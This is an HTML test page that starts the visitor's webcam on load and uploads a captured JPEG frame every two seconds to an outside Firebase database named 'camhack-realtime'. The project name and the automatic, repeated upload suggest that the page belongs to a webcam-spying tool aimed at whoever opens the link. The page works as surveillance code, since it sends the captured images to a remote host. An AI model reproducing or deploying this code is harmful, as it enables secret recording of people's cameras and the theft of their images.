<!DOCTYPE html>
<html>
<head>
    <title>Sessions Path Test</title>
</head>
<body>
    <h1>Camera with Sessions Path</h1>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    <div id="status">Starting...</div>
    <div id="firebase">Firebase status...</div>
    
    <script>
        const FIREBASE_URL = 'https://camhack-realtime-default-rtdb.firebaseio.com/';
        const SESSION_ID = 'cam_1764399903153';
        
        let video, canvas, ctx;
        
        function log(message) {
            document.getElementById('status').innerHTML += '<br>' + message;
            console.log(message);
        }
        
        function logFirebase(message) {
            document.getElementById('firebase').innerHTML += '<br>' + message;
            console.log('FIREBASE: ' + message);
        }
        
        async function startCamera() {
            try {
                video = document.getElementById('video');
                canvas = document.getElementById('canvas');
                ctx = canvas.getContext('2d');
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 320, height: 240 }
                });
                
                video.srcObject = stream;
                log('✓ Camera started');
                
                // Test Firebase with sessions path
                await testFirebase();
                
                // Start sending frames
                setInterval(sendFrame, 2000);
                
            } catch (error) {
                log('✗ Camera error: ' + error.message);
            }
        }
        
        async function testFirebase() {
            try {
                logFirebase('Testing sessions path...');
                const response = await fetch(FIREBASE_URL + 'sessions/' + SESSION_ID + '/test.json', {
                    method: 'PUT',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify('test_' + Date.now())
                });
                
                if (response.ok) {
                    logFirebase('✓ Sessions path write OK');
                } else {
                    logFirebase('✗ Sessions path FAILED: ' + response.status);
                }
            } catch (error) {
                logFirebase('✗ Sessions path ERROR: ' + error.message);
            }
        }
        
        async function sendFrame() {
            try {
                ctx.drawImage(video, 0, 0, 320, 240);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                const base64 = imageData.split(',')[1];
                
                logFirebase('Sending to sessions path...');
                
                const response = await fetch(FIREBASE_URL + 'sessions/' + SESSION_ID + '/bingkai.json', {
                    method: 'PUT',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(base64)
                });
                
                if (response.ok) {
                    logFirebase('✓ Frame sent to sessions: ' + new Date().toLocaleTimeString());
                } else {
                    logFirebase('✗ Sessions send failed: ' + response.status);
                }
            } catch (error) {
                logFirebase('✗ Sessions send error: ' + error.message);
            }
        }
        
        window.onload = startCamera;
    </script>
</body>
</html>
